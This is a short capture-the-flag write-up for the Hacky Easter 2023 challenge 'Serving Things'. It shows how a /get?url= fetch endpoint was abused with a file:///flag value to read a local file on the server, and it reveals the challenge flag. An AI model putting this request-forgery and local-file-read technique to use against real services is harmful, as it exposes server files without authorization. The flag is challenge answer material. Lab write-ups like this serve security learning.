# Description

# Serving Things

Get the 🚩 at /flag.

<http://ch.hackyeaster.com:2316>

Note: The service is restarted every hour at x:00.

# Solution

well i got an ssl error because of hsts in the browser, so lets try curl

```
curl http://ch.hackyeaster.com:2316/
<!DOCTYPE html>

<html>
<head>
<title>Serving Things</title>
    <link rel="stylesheet"
            href="/static/app.css">
        <script src="/static/jquery-3.6.3.min.js" language="javascript"></script>
    <script     src="/static/app.js" language="javascript"></script>
</head>

<body>
        <div id="menu">
        Get: <a id="quotes" href="#">Quotes</a> | <a id="colors" href="#">Colors</a> | <a id="stars" href="#">Stars</a> | 
                <a id="cheese" href="#">Cheese</a> | <a id="wine" href="#">Wine</a> | <a id="meals" href="#">Swiss Meals</a> | 
                <a id="trek" href="#">The Trek</a> | <a id="flag" href="#">Flag</a>
        </div>
        <div id="text">
        </div>
        <div id="footer">
                <div id="created">
                        Created by inik / 2023
                </div>
        </div>
</body>
</html>
```

well there is a strange problem as i can access the site without a redirect to https in a incognito tab

this is a funny thing you get when you press `flag`

```
Thank you hacker! But our flag is in another castle! ~ Bugs Bunny
```

looking in the browsers network tab when pressing on something i found this interesting request:

```
http://ch.hackyeaster.com:2316/get?url=http://quotes:1337/quote
```

so jeah looks like a random redirect!

well after a bit of trying i tried to actally get a local file and it worked:

<http://ch.hackyeaster.com:2316/get?url=file:///flag>

gave me the flag

# FLAG: he2023{4ls0-53rv3r-c4n-b3-1nj3ct3d!!!}
